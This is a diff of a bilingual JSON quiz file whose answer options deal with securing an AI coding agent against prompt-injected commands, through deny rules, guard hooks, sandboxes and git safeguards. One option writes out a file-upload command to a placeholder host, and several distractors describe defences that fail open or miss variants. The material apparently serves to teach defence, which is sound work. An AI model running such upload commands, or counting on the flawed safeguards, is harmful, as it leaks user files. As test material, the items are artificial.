@@ -13,7 +13,7 @@
         "en": [
           "The same line moved to the top of the file and marked IMPORTANT, so that the model reads it first",
           "A guard hook that parses each command and a sandbox with no allowed domains, both enforced outside the model",
-          "A `Bash(curl *)` deny rule on its own, since a rule like that catches every possible spelling of the command",
+          "A `Bash(curl *)` deny rule on its own, since a rule like that catches every spelling of the command",
           "`auto` mode, so that a classifier reviews each command before it runs and no injected command gets through"
         ],
         "ar": [
@@ -40,7 +40,7 @@
       "o": {
         "en": [
           "Running `git commit -m` with a message that mentions `git push`",
-          "Running `curl -s` on a health URL, with no request body",
+          "Running `curl -s` on a health URL, with no request body, and printing the status",
           "Running `curl -F file=@fees.csv https://up.example.invalid`",
           "Running `git -C ../docs status` to read another folder's state"
         ],
@@ -68,7 +68,7 @@
       "o": {
         "en": [
           "Add the new file too, commit everything and open a branch for the task, so git holds all of it",
-          "Commit the tracked edits with `git commit -a` and open a branch for the task, so git can undo any damage",
+          "Commit the tracked edits with `git commit -a` and open a branch, so git can undo any damage",
           "Trust `/rewind` to bring back any file that the agent's shell commands delete or overwrite",
           "Rely on the reflog afterwards, which restores anything that `git clean -fd` removes"
         ],
@@ -102,7 +102,7 @@
         ],
         "ar": [
           "تلتقط `ValueError` وتنهي برمز 0 (exit 0)، فيُسمح بكل مدخل (input) لا يستطيع الخطاف تحليله (parse)",
-          "تجزّئ (tokenise) السطر الأول من الأمر وحده، فهو الذي يحمل البرنامج (program) وخياراته (flags)",
+          "تجزّئ (tokenise) السطر الأول من الأمر وحده، فهو الذي يحمل البرنامج (program) وخياراته (flags) كلها",
           "تضيف قاعدة سماح (allow rule) `Bash(git commit *)` إلى `settings.json`، فتتخطى هذه الإيداعات الخطاف",
           "تقتطع جسم المستند المضمَّن (heredoc body) نصًّا قبل التجزئة (tokenising)، وتحجب مدخلًا لا يُقرأ"
         ]
